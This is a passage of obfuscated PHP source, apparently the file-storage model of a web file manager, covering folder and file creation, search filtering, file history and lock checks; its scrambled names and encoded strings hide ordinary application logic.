…[76] && !$eææææ•Ü) { return !1; } if ($C§£‹ÚÊí›[$cÛœ®Ì …[399]] != $cÛœ®Ì …[76] && $eææææ•Ü) { return !1; } if (!strstr($bÄÂÈÜÃ©í[$cÛœ®Ì …[167]], $cÛœ®Ì …[47] . $C§£‹ÚÊí›[$cÛœ®Ì …[399]] . $cÛœ®Ì …[47])) { return !1; } } if (isset($C§£‹ÚÊí›[$cÛœ®Ì …[1942]]) && $C§£‹ÚÊí›[$cÛœ®Ì …[1942]] < $bÄÂÈÜÃ©í[$cÛœ®Ì …[77]]) { return !1; } if (isset($C§£‹ÚÊí›[$cÛœ®Ì …[1943]]) && $C§£‹ÚÊí›[$cÛœ®Ì …[1943]] > $bÄÂÈÜÃ©í[$cÛœ®Ì …[77]]) { return !1; } goto fèÛ£ÙêÈØ; fèÛ£ÙêÈØ: if (isset($C§£‹ÚÊí›[$cÛœ®Ì …[557]]) && $C§£‹ÚÊí›[$cÛœ®Ì …[557]] != $bÄÂÈÜÃ©í[$cÛœ®Ì …[428]]) { return !1; } return !0; goto A–¸«¤‚²–; D‡¼çĞÙÅ¨: $cÛœ®Ì … =& $_SERVER[…ë˜õ]; $eææææ•Ü = $bÄÂÈÜÃ©í[$cÛœ®Ì …[397]] == $cÛœ®Ì …[86]; if (!strstr($bÄÂÈÜÃ©í[$cÛœ®Ì …[481]], $cÛœ®Ì …[47] . $C§£‹ÚÊí›[$cÛœ®Ì …[472]] . $cÛœ®Ì …[47])) { return !1; } goto Fˆ±óˆÕº ; A–¸«¤‚²–: } public function listSearchChildren($bÉÓ—½ßÑÛ, $AôÌ‰ÎªÓÕ = 5000) { goto Dø»À¨Ó—„; Dø»À¨Ó—„: $E¿Á†—› =& $_SERVER[…ë˜õ]; $b¨ôîßª = array(); $cîëé…•ë™ = $this->sourceInfo($bÉÓ—½ßÑÛ); goto b÷°îÓ„öÊ; D”Ñ¦Æ±Š¤: $Fåò„ÍšŒö = $this->field($E¿Á†—›[390])->where($BÑæ•Šéâí)->select(); $b¨ôîßª = array_to_keyvalue($Fåò„ÍšŒö, $E¿Á†—›[33], $E¿Á†—›[390]); return $b¨ôîßª; goto BÁ¤¯ø˜Ğ™; b÷°îÓ„öÊ: $BÑæ•Šéâí = array($E¿Á†—›[481] => array($E¿Á†—›[378], $cîëé…•ë™[$E¿Á†—›[481]] . $cîëé…•ë™[$E¿Á†—›[390]] . $E¿Á†—›[508])); $A˜¸éŸ‡Ú‹ = $this->field($E¿Á†—›[390])->cache(null, 600)->where($BÑæ•Šéâí)->count(); if ($A˜¸éŸ‡Ú‹ > $AôÌ‰ÎªÓÕ) { return $this->_listSearchChildrenNear($bÉÓ—½ßÑÛ, $AôÌ‰ÎªÓÕ); } goto D”Ñ¦Æ±Š¤; BÁ¤¯ø˜Ğ™: } private function _listSearchChildrenNear($aôóÆæˆïÒ, $aîÊÛ¨’ò ) { goto Fœ‘Š¥‘÷ö; CŸÊéÖìøö: $f‰æßØéÈÓ = $this->field($CÍñ…ºÆê²[1944])->where($aÉŞ £éĞÛ)->select(); $dø¼¿¥‡¿¤ = array_to_keyvalue(array_filter_by_field($f‰æßØéÈÓ, $CÍñ…ºÆê²[397], $CÍñ…ºÆê²[86]), $CÍñ…ºÆê²[33], $CÍñ…ºÆê²[390]); $d·õÊØ¡Í = array_merge($d·õÊØ¡Í, array_to_keyvalue($f‰æßØéÈÓ, $CÍñ…ºÆê²[33], $CÍñ…ºÆê²[390])); goto fáà‚ìßÌ“; fÍ•’Ó«Ì¦: $d·õÊØ¡Í = array_merge($d·õÊØ¡Í, array_to_keyvalue($f‰æßØéÈÓ, $CÍñ…ºÆê²[33], $CÍñ…ºÆê²[390])); $d·õÊØ¡Í = array_slice($d·õÊØ¡Í, 0, $aîÊÛ¨’ò ); return $d·õÊØ¡Í; goto Eßê¬ùæ³; fáà‚ìßÌ“: if (!$dø¼¿¥‡¿¤) { return $d·õÊØ¡Í; } $aÉŞ £éĞÛ = array($CÍñ…ºÆê²[472] => array($CÍñ…ºÆê²[7], $dø¼¿¥‡¿¤)); $f‰æßØéÈÓ = $this->field($CÍñ…ºÆê²[1944])->where($aÉŞ £éĞÛ)->limit($aîÊÛ¨’ò )->select(); goto fÍ•’Ó«Ì¦; Fœ‘Š¥‘÷ö: $CÍñ…ºÆê² =& $_SERVER[…ë˜õ]; $d·õÊØ¡Í = array(); $aÉŞ £éĞÛ = array($CÍñ…ºÆê²[472] => $aôóÆæˆïÒ); goto CŸÊéÖìøö; Eßê¬ùæ³: } private function _listSearchBindPinyin($A‹Ï‚Ò‚Öá, &$eõËˆÔ÷²¬, &$Aˆ°·‰´Œè) { goto C®ß·‚²°‚; a„÷Óµº : $Aˆ°·‰´Œè = $fœ·–—˜ä[1946] . str_replace($fœ·–—˜ä[47], $fœ·–—˜ä[1947], $Aˆ°·‰´Œè); $eƒŒÙˆ® Ê = $eõËˆÔ÷²¬[$fœ·–—˜ä[28]]; unset($eõËˆÔ÷²¬[$fœ·–—˜ä[28]]); goto aè’™ÍÄ«; C®ß·‚²°‚: $fœ·–—˜ä =& $_SERVER[…ë˜õ]; if (!isset($A‹Ï‚Ò‚Öá[$fœ·–—˜ä[1779]]) || !$A‹Ï‚Ò‚Öá[$fœ·–—˜ä[1779]]) { return; } if (!Input::check($A‹Ï‚Ò‚Öá[$fœ·–—˜ä[1779]], $fœ·–—˜ä[314]) || strlen($A‹Ï‚Ò‚Öá[$fœ·–—˜ä[1779]]) < 2) { return; } goto c‹¼’Ì»Ëä; aè’™ÍÄ«: foreach ($eõËˆÔ÷²¬ as $F¿Ù†Şá…Ü => $B‡ÅÃİŒ¡‹) { $bğˆèŸ—¢ƒ[$fœ·–—˜ä[1946] . $F¿Ù†Şá…Ü] = $B‡ÅÃİŒ¡‹; } foreach ($eƒŒÙˆ® Ê as $aÆÌÏ™ªÌİ) { $bğˆèŸ—¢ƒ[] = array($fœ·–—˜ä[1948] => $aÆÌÏ™ªÌİ, $fœ·–—˜ä[963] => $fœ·–—˜ä[1783], array($fœ·–—˜ä[1949] => $aÆÌÏ™ªÌİ, $fœ·–—˜ä[1950] => array($fœ·–—˜ä[7], array($fœ·–—˜ä[438], $fœ·–—˜ä[437])))); } $this->join($b²šğ¦ª); goto Eº­¤›èÉä; Eº­¤›èÉä: $eõËˆÔ÷²¬ = $bğˆèŸ—¢ƒ; goto fœ¬òöŠ‚Œ; c‹¼’Ì»Ëä: $b²šğ¦ª = "\114\105\106\x54\40\112\x4f\x49\116\x20{$this->tablePrefix}\151\x6f\x5f\x73\x6f\165\x72\143\x65\x5f\x6d\145\164\141\x20\x6d\x65\x74\141\40\x6f\156\x20\163\x6f\165\x72\x63\x65\x2e\163\x6f\x75\x72\143\145\x49\104\40\75\x20\x6d\145\164\141\56\163\157\165\162\x63\145\111\104"; $bğˆèŸ—¢ƒ = array(); $Aˆ°·‰´Œè = str_replace(array($fœ·–—˜ä[227], $fœ·–—˜ä[50], $fœ·–—˜ä[1945]), $fœ·–—˜ä[33], $Aˆ°·‰´Œè); goto a„÷Óµº ; fœ¬òöŠ‚Œ: } private function _parseSearchWhere($c»ùÅ­ÙÓÌ) { goto AÆÆÔÎŞšŒ; C·Úƒ¦×øÛ: if (isset($c»ùÅ­ÙÓÌ[$CŸŒÎõ¨ó£[557]]) && $c»ùÅ­ÙÓÌ[$CŸŒÎõ¨ó£[557]]) { $C©­Ï½å¯î[] = array($CŸŒÎõ¨ó£[428] => $c»ùÅ­ÙÓÌ[$CŸŒÎõ¨ó£[557]], $CŸŒÎõ¨ó£[426] => $c»ùÅ­ÙÓÌ[$CŸŒÎõ¨ó£[557]], $CŸŒÎõ¨ó£[963] => $CŸŒÎõ¨ó£[1783]); } if (isset($c»ùÅ­ÙÓÌ[$CŸŒÎõ¨ó£[399]]) && $c»ùÅ­ÙÓÌ[$CŸŒÎõ¨ó£[399]]) { $aŸà¯¢ ‚¿ = $c»ùÅ­ÙÓÌ[$CŸŒÎõ¨ó£[399]]; if ($aŸà¯¢ ‚¿ == $CŸŒÎõ¨ó£[76]) { $C©­Ï½å¯î[$CŸŒÎõ¨ó£[397]] = 1; } else { if ($aŸà¯¢ ‚¿ == $CŸŒÎõ¨ó£[1954]) { $C©­Ï½å¯î[$CŸŒÎõ¨ó£[397]] = 0; } else { if ($aŸà¯¢ ‚¿) { $aŸà¯¢ ‚¿ = is_array($aŸà¯¢ ‚¿) ? $aŸà¯¢ ‚¿ : explode($CŸŒÎõ¨ó£[47], $aŸà¯¢ ‚¿); $C©­Ï½å¯î[$CŸŒÎõ¨ó£[399]] = array($CŸŒÎõ¨ó£[405], $aŸà¯¢ ‚¿); $C©­Ï½å¯î[$CŸŒÎõ¨ó£[397]] = 0; } } } } if (isset($c»ùÅ­ÙÓÌ[$CŸŒÎõ¨ó£[472]]) && $c»ùÅ­ÙÓÌ[$CŸŒÎõ¨ó£[472]]) { $añË‡«Ç¼¹ = $this->sourceInfo($c»ùÅ­ÙÓÌ[$CŸŒÎõ¨ó£[472]]); $C©­Ï½å¯î[$CŸŒÎõ¨ó£[548]] = array($CŸŒÎõ¨ó£[507], $añË‡«Ç¼¹[$CŸŒÎõ¨ó£[481]] . $c»ùÅ­ÙÓÌ[$CŸŒÎõ¨ó£[472]] . $CŸŒÎõ¨ó£[508]); } goto bÕ¬²‹¡¯–; Aï×Æ‰: if (isset($c»ùÅ­ÙÓÌ[$CŸŒÎõ¨ó£[470]]) && $c»ùÅ­ÙÓÌ[$CŸŒÎõ¨ó£[470]]) { $aÅï¿Š¨àˆ = array($CŸŒÎõ¨ó£[1952], $c»ùÅ­ÙÓÌ[$CŸŒÎõ¨ó£[470]]); if ($C©­Ï½å¯î[$CŸŒÎõ¨ó£[83]]) { $C©­Ï½å¯î[$CŸŒÎõ¨ó£[83]] = array($C©­Ï½å¯î[$CŸŒÎõ¨ó£[83]], $aÅï¿Š¨àˆ, $CŸŒÎõ¨ó£[1953]); } else { $C©­Ï½å¯î[$CŸŒÎõ¨ó£[83]] = $aÅï¿Š¨àˆ; } } if (isset($c»ùÅ­ÙÓÌ[$CŸŒÎõ¨ó£[1942]]) && $c»ùÅ­ÙÓÌ[$CŸŒÎõ¨ó£[1942]] > 0) { $C©­Ï½å¯î[$CŸŒÎõ¨ó£[77]] = array($CŸŒÎõ¨ó£[1951], $c»ùÅ­ÙÓÌ[$CŸŒÎõ¨ó£[1942]]); } if (isset($c»ùÅ­ÙÓÌ[$CŸŒÎõ¨ó£[1943]]) && $c»ùÅ­ÙÓÌ[$CŸŒÎõ¨ó£[1943]]) { $aÅï¿Š¨àˆ = array($CŸŒÎõ¨ó£[1952], $c»ùÅ­ÙÓÌ[$CŸŒÎõ¨ó£[1943]]); if ($C©­Ï½å¯î[$CŸŒÎõ¨ó£[77]]) { $C©­Ï½å¯î[$CŸŒÎõ¨ó£[77]] = array($C©­Ï½å¯î[$CŸŒÎõ¨ó£[77]], $aÅï¿Š¨àˆ, $CŸŒÎõ¨ó£[1953]); } else { $C©­Ï½å¯î[$CŸŒÎõ¨ó£[77]] = $aÅï¿Š¨àˆ; } } goto C·Úƒ¦×øÛ; bÕ¬²‹¡¯–: if (isset($c»ùÅ­ÙÓÌ[$CŸŒÎõ¨ó£[1779]]) && trim($c»ùÅ­ÙÓÌ[$CŸŒÎõ¨ó£[1779]])) { $cİ¾ŸÅ¶³Õ = trim($c»ùÅ­ÙÓÌ[$CŸŒÎõ¨ó£[1779]]); $Eø…ÕÓÔà = explode($CŸŒÎõ¨ó£[50], $cİ¾ŸÅ¶³Õ); if (strlen($cİ¾ŸÅ¶³Õ) > 2 && (substr($cİ¾ŸÅ¶³Õ, 0, 1) == $CŸŒÎõ¨ó£[115] && substr($cİ¾ŸÅ¶³Õ, -1) == $CŸŒÎõ¨ó£[115]) || substr($cİ¾ŸÅ¶³Õ, 0, 1) == $CŸŒÎõ¨ó£[55] && substr($cİ¾ŸÅ¶³Õ, -1) == $CŸŒÎõ¨ó£[55]) { $cİ¾ŸÅ¶³Õ = substr($cİ¾ŸÅ¶³Õ, 1, -1); $Eø…ÕÓÔà = array($cİ¾ŸÅ¶³Õ); } $C©­Ï½å¯î[$CŸŒÎõ¨ó£[28]] = array(array($CŸŒÎõ¨ó£[507], $CŸŒÎõ¨ó£[1781] . $cİ¾ŸÅ¶³Õ . $CŸŒÎõ¨ó£[1781])); if (count($Eø…ÕÓÔà) > 1) { $C©­Ï½å¯î[$CŸŒÎõ¨ó£[28]] = array(); foreach ($Eø…ÕÓÔà as $bÁàÀ…§¨Ğ) { if (!trim($bÁàÀ…§¨Ğ)) { continue; } $C©­Ï½å¯î[$CŸŒÎõ¨ó£[28]][] = array($CŸŒÎõ¨ó£[507], $CŸŒÎõ¨ó£[1781] . trim($bÁàÀ…§¨Ğ) . $CŸŒÎõ¨ó£[1781]); } } } return $C©­Ï½å¯î; goto aµƒÌ‹ÆÅ; AÆÆÔÎŞšŒ: $CŸŒÎõ¨ó£ =& $_SERVER[…ë˜õ]; $C©­Ï½å¯î = array(); if (isset($c»ùÅ­ÙÓÌ[$CŸŒÎõ¨ó£[744]]) && $c»ùÅ­ÙÓÌ[$CŸŒÎõ¨ó£[744]]) { $C©­Ï½å¯î[$CŸŒÎõ¨ó£[83]] = array($CŸŒÎõ¨ó£[1951], $c»ùÅ­ÙÓÌ[$CŸŒÎõ¨ó£[744]]); } goto Aï×Æ‰; aµƒÌ‹ÆÅ: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($D¾Á˜ùäÑ) { $d–ŸÅÈ =& $_SERVER[…ë˜õ]; $BÌİæö“¿ = Model($d–ŸÅÈ[497])->where(array($d–ŸÅÈ[1522] => $D¾Á˜ùäÑ))->find(); $Fáâá¢Ùš = $this->_mkdirRoot(SourceModel::TYPE_USER, $D¾Á˜ùäÑ, $BÌİæö“¿[$d–ŸÅÈ[28]]); $this->userDesktopAdd($Fáâá¢Ùš); return $Fáâá¢Ùš; } public function userDesktopAdd($AìõöĞ÷´š) { $CÙŒœğùÖ– =& $_SERVER[…ë˜õ]; $BÂÌÛ—Ôó = LNG($CÙŒœğùÖ–[1955]); $Eç¥Íµ“í = $this->mkdir($AìõöĞ÷´š, $BÂÌÛ—Ôó); $this->metaSet($Eç¥Íµ“í, $CÙŒœğùÖ–[1956], $CÙŒœğùÖ–[86]); $this->metaSet($AìõöĞ÷´š, $CÙŒœğùÖ–[1957], $Eç¥Íµ“í); } public function groupRootAdd($dŞ¥§Ç–·¥) { $Fğßè©ïâ =& $_SERVER[…ë˜õ]; $BáÓ¹Ş§„§ = Model($Fğßè©ïâ[480])->where(array($Fğßè©ïâ[1774] => $dŞ¥§Ç–·¥))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $dŞ¥§Ç–·¥, $BáÓ¹Ş§„§[$Fğßè©ïâ[28]]); } public function systemRootPathAdd($b”¸ƒ¼éÀ) { if ($b”¸ƒ¼éÀ != $_SERVER[…ë˜õ][500]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $b”¸ƒ¼éÀ); } public function userRootRemove($FÆêªšˆ°æ) { $E´ÛÎĞÑ’Ú = $this->sourceRoot(SourceModel::TYPE_USER, $FÆêªšˆ°æ); if (!$E´ÛÎĞÑ’Ú) { return; } $this->remove($E´ÛÎĞÑ’Ú, !1); } public function groupRootRemove($b¿Ûê”ù) { $B„ÇöÒ¹æÏ = $this->sourceRoot(SourceModel::TYPE_GROUP, $b¿Ûê”ù); if (!$B„ÇöÒ¹æÏ) { return; } $this->remove($B„ÇöÒ¹æÏ, !1); } private function _mkdirRoot($EÎ‰Û„¥‚Ö, $CÑÛŞºîÆ, $eÒºœ¾Š„) { goto c„½ªá×í; bÕ‡‚¡›³™: CacheLock::unlock($DºĞÉŸ¦äÌ); return $bóª¦Š¥†ï; goto bŸÒ£Ã¡; F°Ùµ“ó‹±: $DºĞÉŸ¦äÌ = "\x4d\157\144\145\x6c\x53\x6f\165\x72\x63\x65\56\155\153\x64\x69\x72\x52\157\x6f\164\x2e{$EÎ‰Û„¥‚Ö}\56{$CÑÛŞºîÆ}\56" . $eÒºœ¾Š„; CacheLock::lock($DºĞÉŸ¦äÌ); $dÕª¿ÉÓ…„[$f¸¦ó¬ø½[28]] = $eÒºœ¾Š„; goto DšÎ‰²Î²¸; DšÎ‰²Î²¸: $bóª¦Š¥†ï = $this->add($dÕª¿ÉÓ…„); $Bí†Ğ‘ô×á = array($f¸¦ó¬ø½[550] => short_id($bóª¦Š¥†ï)); $this->where(array($f¸¦ó¬ø½[404] => $bóª¦Š¥†ï))->save($Bí†Ğ‘ô×á); goto bÕ‡‚¡›³™; c„½ªá×í: $f¸¦ó¬ø½ =& $_SERVER[…ë˜õ]; $dÕª¿ÉÓ…„ = array($f¸¦ó¬ø½[389] => 0, $f¸¦ó¬ø½[544] => $EÎ‰Û„¥‚Ö, $f¸¦ó¬ø½[545] => $CÑÛŞºîÆ, $f¸¦ó¬ø½[541] => 1, $f¸¦ó¬ø½[546] => USER_ID, $f¸¦ó¬ø½[547] => USER_ID, $f¸¦ó¬ø½[542] => $f¸¦ó¬ø½[33], $f¸¦ó¬ø½[548] => $f¸¦ó¬ø½[493], $f¸¦ó¬ø½[416] => 0, $f¸¦ó¬ø½[543] => 0, $f¸¦ó¬ø½[442] => 0, $f¸¦ó¬ø½[549] => $f¸¦ó¬ø½[33]); if ($A¨øŠ‘íÄ‘ = $this->where($dÕª¿ÉÓ…„)->find()) { return $A¨øŠ‘íÄ‘[$f¸¦ó¬ø½[390]]; } goto F°Ùµ“ó‹±; bŸÒ£Ã¡: } private function sourceRoot($d¼Ì‘İîÒƒ, $a±â¹²àª, $eí‡Ô¹Î’Ä = false) { $D“áæÚ‚•– =& $_SERVER[…ë˜õ]; $d„Òé¤Æ²§ = array($D“áæÚ‚•–[389] => 0, $D“áæÚ‚•–[544] => $d¼Ì‘İîÒƒ, $D“áæÚ‚•–[545] => $a±â¹²àª); if ($cæ¤•šÛˆ = $this->where($d„Òé¤Æ²§)->find()) { return $eí‡Ô¹Î’Ä ? $cæ¤•šÛˆ : $cæ¤•šÛˆ[$D“áæÚ‚•–[390]]; } return !1; } public function sourceRootGroup($Bäç Ù‡‡Ø) { goto C—ÔÙ•Û—Ş; C—ÔÙ•Û—Ş: $bÄõÊâÚÊ =& $_SERVER[…ë˜õ]; if (is_string($Bäç Ù‡‡Ø)) { $Bäç Ù‡‡Ø = array($Bäç Ù‡‡Ø); } $cÆ§ó¶Ğ¾  = array($bÄõÊâÚÊ[389] => 0, $bÄõÊâÚÊ[544] => SourceModel::TYPE_GROUP, $bÄõÊâÚÊ[545] => array($bÄõÊâÚÊ[7], $Bäç Ù‡‡Ø)); goto D¢´æ»¨Ô; D¢´æ»¨Ô: $this->selectPageReset(); $EÕ•™ÕŠĞ© = $this->listSource($cÆ§ó¶Ğ¾ , 1000); $this->selectPageRestore(); goto CÇ¾°ùë½; CÇ¾°ùë½: return array_to_keyvalue($EÕ•™ÕŠĞ©[$bÄõÊâÚÊ[74]], $bÄõÊâÚÊ[478]); goto A®ÇòïÔøÌ; A®ÇòïÔøÌ: } public function mkfile($e˜¤÷ë™Ñˆ, $a®œó¢¥öÇ, $aÒô»¸åª± = '', $a¯„Ñ‘ãÑõ = REPEAT_RENAME) { $AÅ‚êŒìˆò =& $_SERVER[…ë˜õ]; $eÏµ®ÜÓ¦ = Model($AÅ‚êŒìˆò[566])->addFileByContent($aÒô»¸åª±, $a®œó¢¥öÇ); return $this->_createFileCall($e˜¤÷ë™Ñˆ, $a®œó¢¥öÇ, $eÏµ®ÜÓ¦, $a¯„Ñ‘ãÑõ, $AÅ‚êŒìˆò[1220]); } public function addFile($C–‚ø‹Ô—ì, $cÍ„é±ÄŞĞ, $A†Šõ¼äÍ¨, $eĞ£Á¨³‰· = false, $bÊ×öÅÎÉò = REPEAT_RENAME) { $eåİÅÅì•è = Model($_SERVER[…ë˜õ][566])->addFile($cÍ„é±ÄŞĞ, $A†Šõ¼äÍ¨, $eĞ£Á¨³‰·); return $this->_createFileCall($C–‚ø‹Ô—ì, $A†Šõ¼äÍ¨, $eåİÅÅì•è, $bÊ×öÅÎÉò); } public function addFileByFileID($A¸÷œî´é, $AŒê›ÌÉäÚ, $aª³¾Æˆ, $Cª¾ÑŞ£Àù = REPEAT_RENAME) { $C’‚”„­‚¶ =& $_SERVER[…ë˜õ]; $d¦·‡†ì¢– = Model($C’‚”„­‚¶[566])->find($AŒê›ÌÉäÚ); Model($C’‚”„­‚¶[566])->linkAdd($AŒê›ÌÉäÚ); return $this->_createFileCall($A¸÷œî´é, $aª³¾Æˆ, $d¦·‡†ì¢–, $Cª¾ÑŞ£Àù); } public function addFileByRemote($EóêÖ…íš¡, $càäŞ¬ºå’, $a·àŒÈÉŠ, $aëåÂ¥ÛÒ = array(), $A„Ç±ß˜²À = REPEAT_RENAME) { $AòÜø˜Ä†  = Model($_SERVER[…ë˜õ][566])->addFileByRemote($càäŞ¬ºå’, $a·àŒÈÉŠ, $aëåÂ¥ÛÒ); return $this->_createFileCall($EóêÖ…íš¡, $a·àŒÈÉŠ, $AòÜø˜Ä† , $A„Ç±ß˜²À); } private function _createFileCall($E¢êÍ¹•‰Õ, $BÖÎÓğñ, $cÚºœ œô’, $F›—ƒ‰¹, $AÆò‚²å‘¶ = "\x75\160\154\x6f\x61\x64") { goto bÁ£Êñº¥; Aõ®‡¯‚Îå: if ($AÑ”¶¿·¾† && $bô–é¦£´ && $bô–é¦£´ != $fæ÷Á÷Å–) { Model($CÁÉ¶ÓÁß—[1926])->eventCreate($bô–é¦£´, $AÆò‚²å‘¶); } $this->lockWriteEnd($E¢êÍ¹•‰Õ, $BÖÎÓğñ); return $bô–é¦£´; goto eá½ê˜Õ¢˜; bÁ£Êñº¥: $CÁÉ¶ÓÁß— =& $_SERVER[…ë˜õ]; $AÑ”¶¿·¾† = !1; $this->lockWriteStart($E¢êÍ¹•‰Õ, $BÖÎÓğñ); goto b‚ÉîÑ˜ô; b‚ÉîÑ˜ô: $fæ÷Á÷Å– = $this->fileNameExist($E¢êÍ¹•‰Õ, $BÖÎÓğñ); $bô–é¦£´ = $this->_createFile($E¢êÍ¹•‰Õ, $BÖÎÓğñ, $cÚºœ œô’, $F›—ƒ‰¹, $AÑ”¶¿·¾†); if (!$AÑ”¶¿·¾†) { Model($CÁÉ¶ÓÁß—[444])->remove($cÚºœ œô’[$CÁÉ¶ÓÁß—[441]]); } goto Aõ®‡¯‚Îå; eá½ê˜Õ¢˜: } public function mkdir($dš´ô…É˜æ, $F†êÕÌ©ôÃ, $C½ İö¢¼… = REPEAT_SKIP) { goto Aïí¥º‘’É; DÕĞÓßŸËÀ: $FèÈù–Åé = $this->_addSoure($BˆÓŞŸ£š, $BèÀÆß†è); Model($c¯…©ƒùœ—[1926])->eventCreate($FèÈù–Åé, $c¯…©ƒùœ—[1221]); $this->lockWriteEnd($dš´ô…É˜æ, $F†êÕÌ©ôÃ); goto FÌ‚È¨éÑ ; cÍ…Ú‰ÏƒÃ: $this->lockWriteStart($dš´ô…É˜æ, $F†êÕÌ©ôÃ); if ($C½ İö¢¼… !== !1) { $FŠÈ§‡ôİ = $this->fileNameExist($dš´ô…É˜æ, $F†êÕÌ©ôÃ); if ($FŠÈ§‡ôİ && $C½ İö¢¼… != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($dš´ô…É˜æ, $F†êÕÌ©ôÃ); return $FŠÈ§‡ôİ; } $F†êÕÌ©ôÃ = $this->fileNameAuto($dš´ô…É˜æ, $F†êÕÌ©ôÃ, $C½ İö¢¼…); } $BˆÓŞŸ£š = array($c¯…©ƒùœ—[541] => 1, $c¯…©ƒùœ—[407] => $F†êÕÌ©ôÃ, $c¯…©ƒùœ—[542] => $c¯…©ƒùœ—[33], $c¯…©ƒùœ—[442] => 0, $c¯…©ƒùœ—[543] => 0); goto DÕĞÓßŸËÀ; Aïí¥º‘’É: $c¯…©ƒùœ— =& $_SERVER[…ë˜õ]; $BèÀÆß†è = $this->sourceInfo($dš´ô…É˜æ); if (!$BèÀÆß†è) { return !1; } goto cÍ…Ú‰ÏƒÃ; FÌ‚È¨éÑ : return $FèÈù–Åé; goto F˜ä¢ŞÄ“; F˜ä¢ŞÄ“: } private function _createFile($b±…¼îÄĞˆ, $Fù¡¼£‹ÀÅ, $eÑ©È¤«§¨, $bÖ‡¡˜Êô¥, &$f³¡Æ˜ÙÅö) { goto DŞÍàµ±Ï; AÍÁçˆšÀ: $BÚ¼—¥ÏÑ¢ = array($B‘ŒØˆ°˜Ğ[541] => 0, $B‘ŒØˆ°˜Ğ[407] => $Fù¡¼£‹ÀÅ, $B‘ŒØˆ°˜Ğ[542] => get_path_ext($Fù¡¼£‹ÀÅ), $B‘ŒØˆ°˜Ğ[442] => $eÑ©È¤«§¨[$B‘ŒØˆ°˜Ğ[441]], $B‘ŒØˆ°˜Ğ[543] => $eÑ©È¤«§¨[$B‘ŒØˆ°˜Ğ[77]]); $C”×›ƒàÎ£ = $this->_addSoure($BÚ¼—¥ÏÑ¢, $EìÁ„‡šã‡); $this->folderSizeReset($b±…¼îÄĞˆ, intval($BÚ¼—¥ÏÑ¢[$B‘ŒØˆ°˜Ğ[77]])); goto B™³‚‰•–¸; Fˆ²»»Ê¡: if ($bÖ‡¡˜Êô¥ !== !1) { $A¿§³ö× = $this->fileNameExist($b±…¼îÄĞˆ, $Fù¡¼£‹ÀÅ); } $f³¡Æ˜ÙÅö = !0; if ($bÖ‡¡˜Êô¥ && $A¿§³ö×) { if ($bÖ‡¡˜Êô¥ == REPEAT_SKIP) { $f³¡Æ˜ÙÅö = !1; return $A¿§³ö×; } else { if ($bÖ‡¡˜Êô¥ == REPEAT_REPLACE) { $Dâø¸µÜèì = $this->sourceInfo($A¿§³ö×); $fì´”è°Ü = $this->fileHistory($Dâø¸µÜèì, $eÑ©È¤«§¨[$B‘ŒØˆ°˜Ğ[441]], $eÑ©È¤«§¨[$B‘ŒØˆ°˜Ğ[77]]); if (!$fì´”è°Ü) { $f³¡Æ˜ÙÅö = !1; } else { $this->folderSizeReset($b±…¼îÄĞˆ); } return $A¿§³ö×; } else { $Fù¡¼£‹ÀÅ = $this->fileNameAuto($b±…¼îÄĞˆ, $Fù¡¼£‹ÀÅ, $bÖ‡¡˜Êô¥, !1); } } } goto AÍÁçˆšÀ; B™³‚‰•–¸: return $C”×›ƒàÎ£; goto d™çÖ…äÀ´; DŞÍàµ±Ï: $B‘ŒØˆ°˜Ğ =& $_SERVER[…ë˜õ]; $EìÁ„‡šã‡ = $this->sourceInfo($b±…¼îÄĞˆ); if (!$eÑ©È¤«§¨ || !$EìÁ„‡šã‡) { return !1; } goto Fˆ²»»Ê¡; d™çÖ…äÀ´: } protected function fileHistory($f•Õ„¿ß¡Å, $dí©ÍÑ—ëÓ, $cĞßÙ¥Óë¡) { goto Eåâ¼¿Ÿ¢£; eùßŞéªŞ: $this->sourceCacheClear($f•Õ„¿ß¡Å[$f¡ˆ–ÙŸ´[390]]); return !0; goto dÎë²À™Œ; CÖƒƒ•É”ö: Model($f¡ˆ–ÙŸ´[1958])->addHistory($f•Õ„¿ß¡Å); $A½¬ß»òº­ = array($f¡ˆ–ÙŸ´[547] => USER_ID, $f¡ˆ–ÙŸ´[411] => time(), $f¡ˆ–ÙŸ´[441] => $dí©ÍÑ—ëÓ, $f¡ˆ–ÙŸ´[77] => $cĞßÙ¥Óë¡); $this->where(array($f¡ˆ–ÙŸ´[404] => $f•Õ„¿ß¡Å[$f¡ˆ–ÙŸ´[390]]))->save($A½¬ß»òº­); goto eùßŞéªŞ; Eåâ¼¿Ÿ¢£: $f¡ˆ–ÙŸ´ =& $_SERVER[…ë˜õ]; if ($f•Õ„¿ß¡Å[$f¡ˆ–ÙŸ´[441]] == $dí©ÍÑ—ëÓ) { return !1; } $this->checkLock($f•Õ„¿ß¡Å[$f¡ˆ–ÙŸ´[390]], $dí©ÍÑ—ëÓ); goto CÖƒƒ•É”ö; dÎë²À™Œ: } public function checkLock($béÇÆÜÙƒê, $eŞ» Í«ÄÃ) { goto D×„¬ˆÚêÍ; D×„¬ˆÚêÍ: $c©á–ÄÄ› =& $_SERVER[…ë˜õ]; $Aœ³Ó¨›¾ = $this->pathInfo($béÇÆÜÙƒê); if (!$this->fileIsLock($Aœ³Ó¨›¾, !0)) { return; } goto d½‚°î¿¸ö; dª‹ÁÙ³Öœ: show_json(LNG($c©á–ÄÄ›[1961]) . $c©á–ÄÄ›[1962] . LNG($c©á–ÄÄ›[1963]) . $c©á–ÄÄ›[1964] . $CŠî¶ª‹ŸÁ . $c©á–ÄÄ›[1965], !1); goto cæ– ôë¼×; d½‚°î¿¸ö: $cÆˆÁğÏ¢ = Session::get($c©á–ÄÄ›[1959]); $EÖÏØŠÒÍ‰ = substr($Aœ³Ó¨›¾[$c©á–ÄÄ›[28]], 0, -1 - strlen($Aœ³Ó¨›¾[$c©á–ÄÄ›[167]])) . $c©á–ÄÄ›[1483] . $cÆˆÁğÏ¢ . $c©á–ÄÄ›[94] . $Aœ³Ó¨›¾[$c©á–ÄÄ›[167]]; $f—†Áâ§‘ = Model($c©á–ÄÄ›[566])->find($eŞ» Í«ÄÃ); goto c¯àï¤¢Ÿ‚; c¯àï¤¢Ÿ‚: $this->_createFileCall($Aœ³Ó¨›¾[$c©á–ÄÄ›[472]], $EÖÏØŠÒÍ‰, $f—†Áâ§‘, REPEAT_REPLACE, $c©á–ÄÄ›[1220]); $e³ù®¯à¯± = $Aœ³Ó¨›¾[$c©á–ÄÄ›[439]][$c©á–ÄÄ›[505]]; 